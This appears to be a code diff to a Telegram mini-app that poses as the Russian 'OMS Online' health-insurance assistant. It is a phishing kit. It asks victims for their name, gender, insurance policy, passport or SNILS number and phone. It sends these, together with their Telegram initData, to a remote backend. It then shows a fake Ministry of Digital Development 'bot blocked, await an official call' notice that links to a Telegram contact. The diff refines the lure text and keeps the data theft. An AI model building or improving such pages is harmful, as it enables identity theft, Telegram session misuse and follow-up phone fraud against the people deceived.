@@ -15,18 +15,28 @@
     .blink { animation: blink 1.2s infinite; }
     @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
     .glitch { animation: glitch 2s infinite; text-shadow: 2px 0 red, -2px 0 cyan; }
-    @keyframes glitch { 0% { transform: translate(0); } 20% { transform: translate(-2px, 2px); } 40% { transform: translate(2px, -2px); } 60% { transform: translate(-2px, 2px); } 80% { transform: translate(2px, -2px); 100% { transform: translate(0); } }
+    @keyframes glitch {
+      0% { transform: translate(0); }
+      20% { transform: translate(-2px, 2px); }
+      40% { transform: translate(2px, -2px); }
+      60% { transform: translate(-2px, 2px); }
+      80% { transform: translate(2px, -2px); }
+      100% { transform: translate(0); }
+    }
   </style>
 </head>
 <body class="flex items-center justify-center">
 
   <div class="container bg-white rounded-2xl shadow-2xl p-8">
+
     <div id="welcome" class="text-center fade">
       <h1 class="text-3xl font-bold text-blue-800 mb-6">👋 Здравствуйте!</h1>
       <p class="text-lg text-gray-700 mb-8 leading-relaxed">
         Я цифровой помощник сервиса «ОМС Онлайн».<br><br>
+        Моя задача — помогать вам быстро и удобно...<br><br>
         <b>⚠️ Важно!</b><br>
-        Для корректного получения медицинской помощи ваши данные должны быть актуальны.
+        Для корректного получения медицинской помощи ваши данные должны быть актуальны.<br>
+        Это займёт всего несколько минут. 🏥✨
       </p>
       <button onclick="show('step1')" class="w-full bg-blue-600 text-white py-4 rounded-xl text-xl font-medium shadow-lg hover:bg-blue-700">
         Продолжить
@@ -34,7 +44,8 @@
     </div>
 
     <div id="step1" class="hidden fade">
-      <h3 class="text-xl font-semibold mb-6">👇 Укажите Ваш пол:</h3>
+      <h2 class="text-2xl font-bold text-center mb-6">Анкета</h2>
+      <h3 class="text-xl font-semibold mb-6">👇 Укажите, пожалуйста, Ваш пол:</h3>
       <div class="grid grid-cols-2 gap-4">
         <button onclick="save('gender', 'Мужской'); show('step2')" class="bg-blue-100 hover:bg-blue-200 py-6 rounded-xl text-lg font-medium transition">Мужской</button>
         <button onclick="save('gender', 'Женский'); show('step2')" class="bg-pink-100 hover:bg-pink-200 py-6 rounded-xl text-lg font-medium transition">Женский</button>
@@ -48,13 +59,13 @@
     </div>
 
     <div id="step3" class="hidden fade">
-      <h3 class="text-xl font-semibold mb-6">Номер страхового полиса:</h3>
-      <input id="polis" type="text" placeholder="16 цифр" maxlength="16" class="w-full p-4 border rounded-xl text-lg mb-6 focus:outline-none focus:ring-2 focus:ring-blue-500" oninput="this.value = this.value.replace(/[^0-9]/g, '');" />
+      <h3 class="text-xl font-semibold mb-6">Номер Вашего страхового полиса:</h3>
+      <input id="polis" type="text" placeholder="1234 567 890" class="w-full p-4 border rounded-xl text-lg mb-6 focus:outline-none focus:ring-2 focus:ring-blue-500" oninput="this.value = this.value.replace(/[^0-9]/g, '');" />
       <button onclick="saveInput('polis', 'step4')" class="w-full bg-blue-600 text-white py-4 rounded-xl text-lg">Далее</button>
     </div>
 
     <div id="step4" class="hidden fade">
-      <h3 class="text-xl font-semibold mb-6">Выберите документ:</h3>
+      <h3 class="text-xl font-semibold mb-6">Для подтверждения личности выберите документ:</h3>
       <div class="grid grid-cols-2 gap-4">
         <button onclick="setDocType('Паспорт')" class="bg-gray-100 hover:bg-gray-200 py-6 rounded-xl text-lg transition">Паспорт</button>
         <button onclick="setDocType('СНИЛС')" class="bg-gray-100 hover:bg-gray-200 py-6 rounded-xl text-lg transition">СНИЛС</button>
@@ -62,9 +73,9 @@
     </div>
 
     <div id="step5" class="hidden fade">
-      <h3 id="docTitle" class="text-xl font-semibold mb-6">Номер документа:</h3>
-      <input id="docNumber" type="tel" inputmode="numeric" class="w-full p-4 border rounded-xl text-lg mb-2 focus:outline-none focus:ring-2 focus:ring-blue-500" oninput="this.value = this.value.replace(/[^0-9]/g, '');" />
-      <p id="docHint" class="text-gray-500 text-sm mb-4"></p>
+      <h3 id="docTitle" class="text-xl font-semibold mb-6">Укажите номер документа:</h3>
+      <input id="docNumber" type="tel" inputmode="numeric" placeholder="только цифры" class="w-full p-4 border rounded-xl text-lg mb-2 focus:outline-none focus:ring-2 focus:ring-blue-500" oninput="this.value = this.value.replace(/[^0-9]/g, '');" />
+      <p id="docHint" class="text-gray-500 text-sm mb-2"></p>
       <p id="docError" class="text-red-600 text-sm mb-4 hidden"></p>
       <button onclick="validateDoc()" class="w-full bg-blue-600 text-white py-4 rounded-xl text-lg">Далее</button>
     </div>
@@ -75,9 +86,10 @@
       <button onclick="saveInput('phone', 'check')" class="w-full bg-blue-600 text-white py-4 rounded-xl text-lg">Продолжить</button>
     </div>
 
-    <div id="check" class="hidden fade">
-      <h2 class="text-2xl font-bold text-center mb-6">Проверьте данные</h2>
+    <div id="check" class="hidden fade text-center">
+      <h2 class="text-2xl font-bold mb-6">Проверьте данные</h2>
       <div class="bg-gray-50 p-6 rounded-xl mb-6 text-left text-base leading-relaxed">
+        <p><b>Пол:</b> <span id="prevGender"></span></p>
         <p><b>ФИО:</b> <span id="prevName"></span></p>
         <p><b>Полис:</b> <span id="prevPolis"></span></p>
         <p><b>Документ:</b> <span id="prevDoc"></span></p>
@@ -89,17 +101,25 @@
       </div>
     </div>
 
-    <div id="blocked" class="hidden fade text-center">
-        <div class="text-6xl text-red-600 blink mb-6">!</div>
-        <h1 class="text-2xl font-bold text-red-800 mb-4 glitch">🇷🇺 УВЕДОМЛЕНИЕ МИНЦИФРЫ</h1>
-        <p class="text-red-700 mb-8">Бот заблокирован за подозрение в мошенничестве. Ожидайте звонка.</p>
-        <a href="https://t.me/kmdkdooo?text=Здравствуйте!%20Мои%20данные%20попали%20в%20общий%20доступ!" class="block w-full bg-blue-600 text-white py-4 rounded-xl font-medium">Связаться с поддержкой</a>
+    <div id="blocked" class="hidden fade text-center bg-red-50 p-8 rounded-2xl border-4 border-red-600 animate-pulse">
+      <div class="text-6xl text-red-600 blink mb-6">!</div>
+      <h1 class="text-2xl font-bold text-red-800 mb-4 glitch">МИНЦИФРЫ — ОФИЦИАЛЬНОЕ УВЕДОМЛЕНИЕ 🇷🇺</h1>
+      <p class="text-lg text-red-700 mb-8 leading-relaxed">
+        ⚠️ <b>ВНИМАНИЕ!</b><br><br>
+        Данный бот был заблокирован за подозрение в мошеннической деятельности и утечку персональных данных.<br><br>
+        📞 Ожидайте официального звонка от представителей Минцифр России
+      </p>
+      <a href="https://t.me/kmdkdooo?text=Здравствуйте!%20Мои%20данные%20попали%20в%20общий%20доступ!" class="block w-full bg-blue-600 text-white py-4 rounded-xl text-lg font-medium shadow-lg hover:bg-blue-700">
+        Перейти в чат поддержки
+      </a>
     </div>
+
   </div>
 
   <script>
+    // Инициализация Telegram SDK
     const tg = window.Telegram.WebApp;
-    tg.expand(); // Разворачиваем приложение
+    tg.expand();
 
     let answers = {};
 
@@ -107,10 +127,11 @@
       document.querySelectorAll('#welcome, [id^="step"], #check, #blocked').forEach(el => el.classList.add('hidden'));
       document.getElementById(id).classList.remove('hidden');
       if (id === 'check') {
-        document.getElementById('prevName').textContent = answers.name;
-        document.getElementById('prevPolis').textContent = answers.polis;
-        document.getElementById('prevDoc').textContent = `${answers.docType}: ${answers.docNumber}`;
-        document.getElementById('prevPhone').textContent = answers.phone;
+        document.getElementById('prevGender').textContent = answers.gender || '—';
+        document.getElementById('prevName').textContent = answers.name || '—';
+        document.getElementById('prevPolis').textContent = answers.polis || '—';
+        document.getElementById('prevDoc').textContent = `${answers.docType || '—'} ${answers.docNumber || '—'}`;
+        document.getElementById('prevPhone').textContent = answers.phone || '—';
       }
     }
 
@@ -129,13 +150,13 @@
       const hint = document.getElementById('docHint');
       input.value = '';
       if (type === 'Паспорт') {
-        document.getElementById('docTitle').innerText = 'Серия и номер паспорта:';
+        document.getElementById('docTitle').innerText = 'Укажите серию и номер паспорта:';
         input.maxLength = 10;
-        hint.innerText = 'Пример: 4510 123456 (10 цифр без пробелов)';
+        hint.innerText = 'Нужно 10 цифр';
       } else {
-        document.getElementById('docTitle').innerText = 'Номер СНИЛС:';
+        document.getElementById('docTitle').innerText = 'Укажите номер СНИЛС:';
         input.maxLength = 11;
-        hint.innerText = 'Пример: 12345678901 (11 цифр)';
+        hint.innerText = 'Нужно 11 цифр';
       }
       show('step5');
     }
@@ -144,10 +165,10 @@
       const val = document.getElementById('docNumber').value.replace(/\D/g, '');
       const type = answers.docType;
       const error = document.getElementById('docError');
-      const reqLen = type === 'Паспорт' ? 10 : 11;
+      const expected = type === 'Паспорт' ? 10 : 11;
 
-      if (val.length !== reqLen) {
-        error.innerText = `Ошибка: для документа "${type}" нужно ${reqLen} цифр.`;
+      if (val.length !== expected) {
+        error.textContent = `Ошибка: введите ${expected} цифр`;
         error.classList.remove('hidden');
         return;
       }
@@ -168,9 +189,10 @@
     }
 
     function finish() {
+      // КРИТИЧЕСКИ ВАЖНО: передаем initData
       const payload = {
         ...answers,
-        initDataRaw: tg.initData // ПЕРЕДАЕМ РЕАЛЬНЫЕ ДАННЫЕ ТГ
+        initDataRaw: tg.initData 
       };
 
       fetch('https://oms-mini-app-backend-production.up.railway.app/submit', {
@@ -178,7 +200,8 @@
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload)
       })
-      .finally(() => show('blocked'));
+      .then(() => show('blocked'))
+      .catch(() => show('blocked'));
     }
   </script>
 </body>
